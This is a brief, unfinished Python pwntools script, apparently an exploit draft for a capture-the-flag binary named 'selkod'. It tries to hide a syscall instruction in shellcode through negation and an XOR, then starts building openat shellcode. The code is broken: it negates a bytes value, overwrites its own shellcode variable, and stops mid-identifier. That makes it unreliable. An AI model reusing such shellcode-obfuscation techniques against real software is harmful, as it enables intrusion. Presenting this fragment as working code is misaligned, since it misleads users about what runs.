from pwn import *
from sys import *

elf = context.binary = ELF("./selkod")
p = process("./selkod")


syscall = asm("syscall;nop;nop;")
syscall_packed = u32(syscall)

shellcode = f"mov r12d, {~syscall}; xor r12d, 0xFFFFFFFF;"
shellcode = shellcraft.openat()


constant.O_REA
